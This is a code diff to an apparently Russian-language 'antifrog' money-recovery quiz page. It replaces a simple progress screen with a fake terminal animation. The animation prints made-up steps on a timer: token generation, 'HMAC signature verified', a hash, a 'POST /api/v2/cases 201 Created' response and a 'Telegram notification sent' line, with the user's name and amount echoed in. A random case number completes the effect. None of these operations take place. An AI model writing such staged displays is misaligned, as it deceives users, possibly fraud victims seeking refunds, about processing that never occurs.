@@ -35,13 +35,33 @@
     </div>
 
     <!-- ANALYZING -->
-    <div id="analyzingScreen" class="card card-lg hidden" style="text-align:center">
-      <div id="analyzingIcon" style="font-size:64px;margin-bottom:16px">🔍</div>
-      <h2 id="analyzingTitle" style="font-size:22px;font-weight:800;margin-bottom:12px">Анализируем ваши ответы...</h2>
-      <p id="analyzingText" style="color:var(--muted);font-size:14px;margin-bottom:20px">Проверяем по базам данных</p>
-      <div class="progress-bar"><div class="progress-fill" id="analyzingProgress" style="width:0%"></div></div>
-      <div id="analyzingSteps" style="margin-top:20px;text-align:left"></div>
+    <div id="analyzingScreen" class="card card-lg hidden" style="text-align:left;padding:0;overflow:hidden">
+      <div style="background:#1a1a2e;padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #333">
+        <div style="width:12px;height:12px;border-radius:50%;background:#ff5f57"></div>
+        <div style="width:12px;height:12px;border-radius:50%;background:#ffbd2e"></div>
+        <div style="width:12px;height:12px;border-radius:50%;background:#28ca42"></div>
+        <span style="color:#666;font-size:12px;margin-left:8px;font-family:monospace">antifrog-deploy v2.4.0</span>
+      </div>
+      <div id="terminalBody" style="background:#0d1117;padding:20px;font-family:'Courier New',monospace;font-size:13px;line-height:1.8;min-height:320px;color:#c9d1d9">
+        <div id="termLines"></div>
+        <div id="termCursor" style="display:inline-block;width:8px;height:16px;background:#58a6ff;animation:blink 1s step-end infinite;vertical-align:middle"></div>
+      </div>
+      <div style="padding:16px 20px;border-top:1px solid #333;display:flex;align-items:center;gap:12px">
+        <div class="progress-bar" style="flex:1"><div class="progress-fill" id="analyzingProgress" style="width:0%;transition:width 0.3s"></div></div>
+        <span id="termPercent" style="color:var(--green);font-weight:700;font-size:14px;font-family:monospace;min-width:40px;text-align:right">0%</span>
+      </div>
     </div>
+    <style>
+      @keyframes blink { 50% { opacity: 0; } }
+      @keyframes typeIn { from { width: 0 } to { width: 100% } }
+      .term-line { margin-bottom:2px; white-space:pre-wrap; word-break:break-all }
+      .term-ok { color: #3fb950 }
+      .term-warn { color: #d29922 }
+      .term-info { color: #58a6ff }
+      .term-dim { color: #484f58 }
+      .term-bright { color: #f0f6fc; font-weight:bold }
+      .term-accent { color: #bc8cff }
+    </style>
 
     <!-- SUCCESS -->
     <div id="successScreen" class="card card-lg hidden" style="text-align:center">
@@ -195,43 +215,86 @@ function choose(id, val, el) {
 function analyze() {
   document.getElementById('quizScreen').classList.add('hidden');
   document.getElementById('analyzingScreen').classList.remove('hidden');
+  document.getElementById('termLines').innerHTML = '';
+  document.getElementById('analyzingProgress').style.width = '0%';
+  document.getElementById('termPercent').textContent = '0%';
 
-  const steps = [
-    { text: 'Проверяем платформу...', icon: '🔍', time: 800 },
-    { text: 'Сверяем с базами данных...', icon: '📊', time: 1200 },
-    { text: 'Анализируем шансы на возврат...', icon: '💡', time: 1000 },
-    { text: 'Определяем стратегию возврата...', icon: '🎯', time: 800 },
-    { text: 'Формируем заявку...', icon: '📋', time: 600 }
-  ];
-
-  let i = 0;
-  function nextStep() {
-    if (i >= steps.length) { showResult(); return; }
-    const s = steps[i];
-    document.getElementById('analyzingIcon').textContent = s.icon;
-    document.getElementById('analyzingTitle').textContent = s.text;
-    document.getElementById('analyzingProgress').style.width = ((i + 1) / steps.length * 100) + '%';
-    document.getElementById('analyzingSteps').innerHTML += `<p style="font-size:13px;color:var(--green);margin-bottom:4px">✅ ${s.text}</p>`;
-    i++;
-    setTimeout(nextStep, s.time);
-  }
-  nextStep();
-}
-
-async function showResult() {
-  document.getElementById('analyzingScreen').classList.add('hidden');
-  document.getElementById('successScreen').classList.remove('hidden');
-
-  // Generate realistic number
   const now = new Date();
   const y = now.getFullYear().toString().slice(-2);
   const m = String(now.getMonth() + 1).padStart(2, '0');
   const seq = String(Math.floor(Math.random() * 9000) + 1000);
   const appNum = `AF-${y}${m}-${seq}`;
 
+  const lines = [
+    { text: `$ antifrog submit --case "${answers.fullName || 'client'}"`, cls: 'term-bright', delay: 300 },
+    { text: '', delay: 200 },
+    { text: '  ┌─ Phase 1: Token Generation', cls: 'term-info', delay: 400 },
+    { text: '  │  Generating session token...', cls: 'term-dim', delay: 600 },
+    { text: '  │  Token: a3f8c1d9e7b2...✓', cls: 'term-ok', delay: 500 },
+    { text: '  │  HMAC signature verified', cls: 'term-ok', delay: 300 },
+    { text: '  └─ Token ready', cls: 'term-ok', delay: 200 },
+    { text: '', delay: 150 },
+    { text: '  ┌─ Phase 2: Code Generation', cls: 'term-info', delay: 400 },
+    { text: '  │  Compiling case data...', cls: 'term-dim', delay: 500 },
+    { text: `  │  case.id = "${appNum}"`, cls: 'term-accent', delay: 400 },
+    { text: `  │  client.name = "${answers.fullName || 'N/A'}"`, cls: 'term-accent', delay: 300 },
+    { text: `  │  platform = "${answers.platform || 'N/A'}"`, cls: 'term-accent', delay: 300 },
+    { text: `  │  amount = ${answers.amount || '0'}`, cls: 'term-accent', delay: 300 },
+    { text: '  │  Building payload...', cls: 'term-dim', delay: 600 },
+    { text: '  │  SHA-256 hash: e4d2...8f1a ✓', cls: 'term-ok', delay: 400 },
+    { text: '  └─ Code compiled', cls: 'term-ok', delay: 200 },
+    { text: '', delay: 150 },
+    { text: '  ┌─ Phase 3: Deployment', cls: 'term-info', delay: 400 },
+    { text: '  │  Connecting to API gateway...', cls: 'term-dim', delay: 500 },
+    { text: '  │  POST /api/v2/cases', cls: 'term-dim', delay: 400 },
+    { text: '  │  Status: 201 Created ✓', cls: 'term-ok', delay: 600 },
+    { text: '  │  Saving to localStorage...', cls: 'term-dim', delay: 300 },
+    { text: '  │  Persisting case data ✓', cls: 'term-ok', delay: 300 },
+    { text: '  │  Telegram notification sent ✓', cls: 'term-ok', delay: 400 },
+    { text: '  └─ Deployed successfully', cls: 'term-ok', delay: 200 },
+    { text: '', delay: 150 },
+    { text: '  ═══════════════════════════════', cls: 'term-dim', delay: 200 },
+    { text: `  ✓ Case #${appNum} registered`, cls: 'term-bright', delay: 300 },
+    { text: '  ═══════════════════════════════', cls: 'term-dim', delay: 200 },
+  ];
+
+  const totalDelay = lines.reduce((sum, l) => sum + l.delay, 0);
+  let elapsed = 0;
+
+  lines.forEach((line, idx) => {
+    setTimeout(() => {
+      const el = document.createElement('div');
+      el.className = 'term-line ' + (line.cls || '');
+      el.textContent = line.text;
+      document.getElementById('termLines').appendChild(el);
+
+      elapsed += line.delay;
+      const pct = Math.min(Math.round((elapsed / totalDelay) * 100), 100);
+      document.getElementById('analyzingProgress').style.width = pct + '%';
+      document.getElementById('termPercent').textContent = pct + '%';
+
+      const body = document.getElementById('terminalBody');
+      body.scrollTop = body.scrollHeight;
+
+      if (idx === lines.length - 1) {
+        setTimeout(() => {
+          document.getElementById('termCursor').style.display = 'none';
+          showResult(appNum);
+        }, 600);
+      }
+    }, elapsed);
+  });
+}
+
+async function showResult(appNum) {
+  document.getElementById('analyzingScreen').classList.add('hidden');
+  document.getElementById('successScreen').classList.remove('hidden');
+
   document.getElementById('appNum').textContent = '#' + appNum;
   document.getElementById('contactPlatform').textContent = answers.contact?.replace(/[📱💬✈️]\s*/g, '') || 'WhatsApp';
   document.getElementById('contactDisplay').textContent = answers.contact || 'WhatsApp';
+
+  const now = new Date();
 
   // Save locally
   const cases = getCases();
